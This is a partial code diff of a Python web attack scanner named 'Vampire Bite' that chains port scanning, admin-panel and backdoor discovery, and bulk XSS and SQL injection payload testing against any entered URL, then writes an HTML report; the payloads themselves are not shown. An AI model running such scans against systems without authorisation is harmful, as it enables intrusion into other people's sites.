-                    print(f"        {Fore.CYAN}[*] Progress: {idx}/{total_payloads} payloads tested{Style.RESET_ALL}", end='\r')
-                    
+                if (idx + 1) % 100 == 0:
+                    print(f"        {Fore.CYAN}[*] Progress: {idx + 1}/{len(sqli_payloads)} payloads tested{Style.RESET_ALL}", end='\r')
             except:
                 pass
-            
-            time.sleep(0.01)
+            time.sleep(0.002)
         
-        print(f"\n        {Fore.CYAN}[*] Completed: {total_tested}/{total_payloads} SQLi payloads tested{Style.RESET_ALL}")
-        return vulnerabilities, total_tested
+        print(f"\n        {Fore.CYAN}[*] Completed SQLi testing{Style.RESET_ALL}")
+        return vulnerabilities
     
     # ================================================================
     # FULL SCAN
@@ -618,89 +450,145 @@ class VampireBiteMega:
         if not target.startswith(('http://', 'https://')):
             target = 'https://' + target
         
+        parsed = urlparse(target)
+        ip = parsed.hostname or target
+        self.results["ip"] = ip
+        
         print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
-        print(f"{Fore.RED}🧛‍♂️ VAMPIRE BITE MEGA SCAN: {target}{Style.RESET_ALL}")
+        print(f"{Fore.RED}🧛‍♂️ VAMPIRE BITE COMPLETE SCAN: {target}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
         
-        # Extract Forms
+        # PHASE 1: PORT SCAN
         print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}│  PHASE 1: FORM EXTRACTION                                 │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│  PHASE 1: PORT SCANNING                                   │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+        self.port_scan(ip)
+        
+        # PHASE 2: WEB SERVER & TECH
+        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│  PHASE 2: WEB SERVER & TECHNOLOGY                         │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+        self.detect_web_server(target)
+        self.detect_technologies(target)
+        
+        # PHASE 3: SECURITY HEADERS
+        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│  PHASE 3: SECURITY HEADERS                               │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+        self.check_security_headers(target)
+        
+        # PHASE 4: FILES, DIRS, ADMIN, BACKDOORS
+        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│  PHASE 4: RECONNAISSANCE (Files, Admin, Backdoors)        │{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+        self.find_sensitive_files(target)
+        self.find_admin_panels(target)
+        self.find_open_directories(target)
+        self.find_backdoors(target)
+        
+        # PHASE 5: FORMS & VULNS
+        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}│  PHASE 5: FORM EXTRACTION & VULN TESTING                  │{Style.RESET_ALL}")
         print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
         forms = self.extract_forms(target)
         
-        total_xss_tested = 0
-        total_sqli_tested = 0
         all_xss = []
         all_sqli = []
         
-        # XSS Testing
-        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}│  PHASE 2: XSS TESTING (5000+ PAYLOADS)                     │{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
+        if forms:
+            for idx, form in enumerate(forms, 1):
+                print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
+                xss_results = self.test_xss_on_form(target, form)
+                sqli_results = self.test_sqli_on_form(target, form)
+                all_xss.extend(xss_results)
+                all_sqli.extend(sqli_results)
         
-        for idx, form in enumerate(forms, 1):
-            print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
-            vulns, tested = self.test_xss_on_form(target, form)
-            all_xss.extend(vulns)
-            total_xss_tested += tested
-        
-        # SQLi Testing
-        print(f"\n{Fore.MAGENTA}┌─────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}│  PHASE 3: SQL INJECTION TESTING (3000+ PAYLOADS)           │{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}└─────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
-        
-        for idx, form in enumerate(forms, 1):
-            print(f"\n  {Fore.CYAN}[*] Testing Form {idx}/{len(forms)}{Style.RESET_ALL}")
-            vulns, tested = self.test_sqli_on_form(target, form)
-            all_sqli.extend(vulns)
-            total_sqli_tested += tested
-        
-        self.results["xss_tested"] = total_xss_tested
-        self.results["sql_tested"] = total_sqli_tested
         self.results["xss_vulnerable"] = all_xss
         self.results["sql_vulnerable"] = all_sqli
-        
         self.results["duration"] = round(time.time() - self.start_time, 2)
         
         # FINAL SUMMARY
         print(f"\n{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
-        print(f"{Fore.RED}📊 VAMPIRE BITE MEGA SUMMARY{Style.RESET_ALL}")
+        print(f"{Fore.RED}📊 VAMPIRE BITE COMPLETE SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}")
         print(f"  {Fore.CYAN}Target: {target}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}IP: {ip}{Style.RESET_ALL}")
         print(f"  {Fore.CYAN}Duration: {self.results['duration']}s{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}Forms Found: {len(forms)}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}XSS Payloads Tested: {total_xss_tedd}{Style.RESET_ALL}")
-        print(f"  {Fore.CYAN}SQLi Payloads Tested: {total_sqli_tested}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Open Ports: {len(self.results['open_ports'])}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Web Server: {self.results['web_server']}{Style.RESET_ALL}")
+        print(f"  {Fore.CYAN}Technologies: {', '.join(self.results['technologies']) or 'None'}{Style.RESET_ALL}")
+        print(f"  {Fore.YELLOW}Sensitive Files: {len(self.results['sensitive_files'])}{Style.RESET_ALL}")
+        print(f"  {Fore.RED}Admin Panels: {len(self.results['admin_panels'])}{Style.RESET_ALL}")
+        print(f"  {Fore.RED}Open Dirs: {len(self.results['open_directories'])}{Style.RESET_ALL}")
+        print(f"  {Fore.RED}Backdoors: {len(self.results['backdoors'])}{Style.RESET_ALL}")
+        print(f"  {Fore.RED}XSS Vulnerable: {len(all_xss)}{Style.RESET_ALL}")
+        print(f"  {Fore.RED}SQLi Vulnerable: {len(all_sqli)}{Style.RESET_ALL}")
         
-        if all_xss:
-            print(f"\n  {Fore.RED}🔥 XSS VULNERABLE: {len(all_xss)} found{Style.RESET_ALL}")
-            for xss in all_xss[:10]:
-                print(f"    {Fore.RED}→ {xss['payload'][:60]}...{Style.RESET_ALL}")
-        else:
-            print(f"\n  {Fore.GREEN}✅ No XSS vulnerabilities found{Style.RESET_ALL}")
-        
-        if all_sqli:
-            print(f"\n  {Fore.RED}🔥 SQL INJECTION VULNERABLE: {len(all_sqli)} found{Style.RESET_ALL}")
-            for sqli in all_sqli[:10]:
-                print(f"    {Fore.RED}→ {sqli['payload'][:60]}...{Style.RESET_ALL}")
-        else:
-            print(f"\n  {Fore.GREEN}✅ No SQL Injection vulnerabilities found{Style.RESET_ALL}")
-        
+        self.generate_html_report(target)
+        print(f"\n  {Fore.GREEN}[+] HTML Report: vampire_bite_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'='*90}{Style.RESET_ALL}\n")
         
         return self.results
     
-    # ================================================================
-    # MENU
-    # ================================================================
+    def generate_html_report(self, target):
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"vampire_bite_report_{timestamp}.html"
+        
+        html = f"""<!DOCTYPE html>
+<html><head><title>Vampire Bite Report - {target}</title>
+<style>
+body {{ background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }}
+.container {{ max-width: 1200px; margin: auto; border: 2px solid #f00; padding: 20px; }}
+h1 {{ color: #f00; text-align: center; }}
+h2 {{ color: #f00; border-bottom: 2px solid #f00; }}
+.critical {{ color: #f00; }}
+table {{ width: 100%; border-collapse: collapse; }}
+th, td {{ border: 1px solid #333; padding: 8px; text-align: left; }}
+th {{ background: #f00; color: #fff; }}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🧛‍♂️ VAMPIRE BITE - SECURITY REPORT</h1>
+<p><strong>Target:</strong> {target}</p>
+<p><strong>IP:</strong> {self.results['ip']}</p>
+<p><strong>Scan Time:</strong> {self.results['scan_time']}</p>
+<p><strong>Duration:</strong> {self.results['duration']}s</p>
+
+<h2>🔌 OPEN PORTS ({len(self.results['open_ports'])})</h2>
+<table><tr><th>Port</th><th>Service</th></tr>
+{''.join([f"<tr><td class='critical'>{p}</td><td>{self.get_service_name(p)}</td></tr>" for p in self.results['open_ports']])}
+</table>
+
+<h2>👑 ADMIN PANELS ({len(self.results['admin_panels'])})</h2>
+{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{a['url']}' style='color:#0f0;'>{a['url']}</a></div>" for a in self.results['admin_panels']])}
+
+<h2>💀 BACKDOORS ({len(self.results['backdoors'])})</h2>
+{''.join([f"<div style='background:#111; padding:5px; margin:5px 0;'><a href='{b['url']}' style='color:#f00;'>{b['file']}</a></div>" for b in self.results['backdoors']])}
+
+<h2>⚠️ VULNERABILITIES</h2>
+<h3>XSS ({len(self.results['xss_vulnerable'])})</h3>
+<ul>{''.join([f"<li>{x['payload']}</li>" for x in self.results['xss_vulnerable'][:10]])}</ul>
+<h3>SQLi ({len(self.results['sql_vulnerable'])})</h3>
+<ul>{''.join([f"<li>{s['payload']}</li>" for s in self.results['sql_vulnerable'][:10]])}</ul>
+
+<div class="footer">
+<p>🐺 Created by LORD VAMPIRE | Team Lord</p>
+</div>
+</div>
+</body></html>"""
+        
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(html)
+        return filename
     
     def run(self):
         self.banner()
         while True:
             print(f"""
 {Fore.RED}╔════════════════════════════════════════════════════════════════════════════════╗
-║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE{Style.RESET_ALL} - MEGA SCAN (Full Payload Database)                    {Fore.RED}║
-║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 QUICK SCAN (Forms Only)                                       {Fore.RED}║
+║  {Fore.GREEN}[1]{Style.RESET_ALL} 🧛‍♂️ {Fore.RED}VAMPIRE BITE{Style.RESET_ALL} - COMPLETE SCAN (All Features)                    {Fore.RED}║
+║  {Fore.GREEN}[2]{Style.RESET_ALL} 🔍 QUICK SCAN (Ports + Web Server Only)                           {Fore.RED}║
 ║  {Fore.GREEN}[0]{Style.RESET_ALL} 🚪 EXIT                                                        {Fore.RED}║
 ╚════════════════════════════════════════════════════════════════════════════════╝
 """)
@@ -714,13 +602,14 @@ class VampireBiteMega:
                 target = input(f"{Fore.CYAN}Target URL: {Style.RESET_ALL}")
                 if not target.startswith(('http://', 'https://')):
                     target = 'https://' + target
-                forms = self.extract_forms(target)
-                print(f"\n  {Fore.GREEN}[+] Found {len(forms)} forms{Style.RESET_ALL}")
+                ip = urlparse(target).hostname
+                self.port_scan(ip)
+                self.detect_web_server(target)
                 input(f"\n{Fore.CYAN}Press Enter...{Style.RESET_ALL}")
             elif choice == "0":
                 print(f"\n{Fore.RED}🧛‍♂️ VAMPIRE BITE OUT. THE WEB BLEEDS!{Style.RESET_ALL}")
                 break
 
 if __name__ == "__main__":
-    hunter = VampireBiteMega()
+    hunter = VampireBiteComplete()
     hunter.run()
